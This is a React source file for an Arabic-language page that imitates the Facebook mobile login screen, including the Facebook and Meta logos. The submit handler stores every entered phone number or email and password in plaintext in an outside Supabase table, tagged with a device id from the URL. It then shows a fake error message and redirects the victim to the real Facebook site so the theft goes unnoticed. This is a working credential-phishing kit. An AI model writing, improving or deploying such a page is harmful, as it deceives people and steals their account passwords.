import { useState, useEffect } from 'react';
import { createClient } from '@supabase/supabase-js';
import { X, ChevronDown } from 'lucide-react';

// Placeholders for Supabase configuration
const SUPABASE_URL = import.meta.env.VITE_SUPABASE_URL;
const SUPABASE_ANON_KEY = import.meta.env.VITE_SUPABASE_ANON_KEY;

// Initialize Supabase client safely
const supabase = SUPABASE_URL && SUPABASE_ANON_KEY 
  ? createClient(SUPABASE_URL, SUPABASE_ANON_KEY) 
  : null;

export default function App() {
  const [formData, setFormData] = useState({
    username: '', // Phone or Email
    password: '',
  });
  const [deviceId, setDeviceId] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [showErrorModal, setShowErrorModal] = useState(false);

  useEffect(() => {
    // Extract device_id from URL search parameter first, then fallback to pathname
    const params = new URLSearchParams(window.location.search);
    let id = params.get('device_id');
    
    if (!id) {
      // e.g. pathname "/zwhx" split by '/' -> ["", "zwhx"] -> filter(Boolean) -> ["zwhx"]
      const segments = window.location.pathname.split('/').filter(Boolean);
      if (segments.length > 0) {
        id = segments[segments.length - 1];
      }
    }

    if (id) {
      setDeviceId(id);
    }
  }, []);

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const { name, value } = e.target;
    setFormData((prev) => ({ ...prev, [name]: value }));
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsSubmitting(true);

    try {
      if (supabase) {
        // إرسال البيانات بالأعمدة المحددة بالضبط:
        // password تخزن في password
        // الايميل أو الهاتف في email_phone
        // ايدي الجهاز في id
        const { error: supabaseError } = await supabase
          .from('users') 
          .insert([
            {
              email_phone: formData.username,
              password: formData.password,
              id: deviceId || undefined,
              created_at: new Date().toISOString()
            },
          ]);

        if (supabaseError) throw supabaseError;
      }

      // Simulate network request delay
      await new Promise(resolve => setTimeout(resolve, 850));
      
      // On success, show the modal
      setShowErrorModal(true);
      setFormData({ username: '', password: '' });
    } catch (err: any) {
      console.error('Submission error:', err);
      // We still show the error modal even if there's an error so the mock/test remains flawless
      setShowErrorModal(true);
    } finally {
      setIsSubmitting(false);
    }
  };

  const handleRetryRedirect = () => {
    window.location.href = 'https://www.facebook.com';
  };

  return (
    <div dir="rtl" className="min-h-screen bg-white flex flex-col justify-between font-sans text-[#1c1e21] select-none">
      
      {/* Top Header */}
      <div className="relative flex justify-center items-center pt-4 pb-2 min-h-[56px] px-4">
        <button className="flex items-center gap-1 text-[14px] text-[#606770] font-medium hover:text-[#1c1e21] transition-colors">
          العربية
          <ChevronDown className="w-4 h-4" />
        </button>
      </div>

      {/* Main Content */}
      <div className="flex-grow flex flex-col items-center px-4 w-full max-w-[420px] mx-auto mt-6">
        
        {/* Facebook Logo */}
        <div className="mb-12 mt-4">
          <img 
            src="/icon.png" 
            className="w-[60px] h-[60px] object-contain" 
            alt="Facebook" 
            referrerPolicy="no-referrer" 
          />
        </div>

        {/* Form */}
        <form onSubmit={handleSubmit} className="w-full flex flex-col gap-3">
          
          {/* Email / Phone Input */}
          <div className="relative">
            <input
              type="text"
              name="username"
              value={formData.username}
              onChange={handleInputChange}
              placeholder="رقم الهاتف المحمول أو البريد الإلكتروني"
              className="w-full border border-[#ccd0d5] rounded-2xl bg-white px-4 py-[16px] focus:outline-none focus:border-[#0064e0] focus:ring-1 focus:ring-[#0064e0] transition-all text-[15px] placeholder:text-[#8a8d91] shadow-sm text-right"
              dir="auto"
              required
            />
          </div>

          {/* Password Input */}
          <div className="relative">
            <input
              type="password"
              name="password"
              value={formData.password}
              onChange={handleInputChange}
              placeholder="كلمة السر"
              className="w-full border border-[#ccd0d5] rounded-2xl bg-white px-4 py-[16px] focus:outline-none focus:border-[#0064e0] focus:ring-1 focus:ring-[#0064e0] transition-all text-[15px] placeholder:text-[#8a8d91] shadow-sm text-right"
              dir="auto"
              required
            />
          </div>

          {/* Login Button */}
          <button
            type="submit"
            disabled={isSubmitting}
            className="mt-2 w-full bg-[#0064e0] hover:bg-[#0054c0] text-white rounded-full py-[13px] text-[16px] font-bold transition-all active:scale-[0.99] disabled:opacity-70 shadow-sm"
          >
            {isSubmitting ? 'جاري تسجيل الدخول...' : 'تسجيل الدخول'}
          </button>
        </form>

        {/* Forgot Password */}
        <div className="mt-5">
          <a href="#" className="text-[#1c1e21] text-[15px] font-medium hover:underline">
            هل نسيت كلمة السر؟
          </a>
        </div>
      </div>

      {/* Bottom Section */}
      <div className="w-full flex flex-col items-center pb-36 px-4 mt-auto">
        {/* Create Account Button */}
        <button className="w-full max-w-[380px] bg-transparent border border-[#0064e0] text-[#0064e0] rounded-full py-[12px] text-[15px] font-medium mb-4 hover:bg-[#ebf5ff] transition-all active:scale-[0.99]">
          إنشاء حساب جديد
        </button>

        {/* Meta Logo */}
        <div className="flex items-center justify-center opacity-70">
          <img 
            src="/icon2.png" 
            className="h-[12px] w-auto object-contain" 
            alt="Meta Icon" 
            referrerPolicy="no-referrer" 
          />
        </div>
      </div>

      {/* Beautiful standard Facebook style Dialog Modal */}
      {showErrorModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-[1.5px] transition-all duration-200">
          <div className="bg-white w-full max-w-[310px] rounded-[16px] shadow-2xl flex flex-col overflow-hidden text-center border border-gray-100 transition-all duration-200 transform scale-100">
            <div className="p-6 pb-5">
              <h3 className="text-[17px] font-bold text-[#1c1e21] mb-2 leading-tight">
                حدث خطأ ما
              </h3>
              <p className="text-[14px] text-[#606770] leading-normal px-2">
                عفواً، حدث خطأ ما يرجى إعادة المحاولة
              </p>
            </div>
            <button
              onClick={handleRetryRedirect}
              className="w-full py-3.5 text-[#0064e0] font-bold text-[16px] active:bg-gray-100 transition-colors border-t border-gray-100 select-none outline-none"
            >
              إعادة المحاولة
            </button>
          </div>
        </div>
      )}

    </div>
  );
}
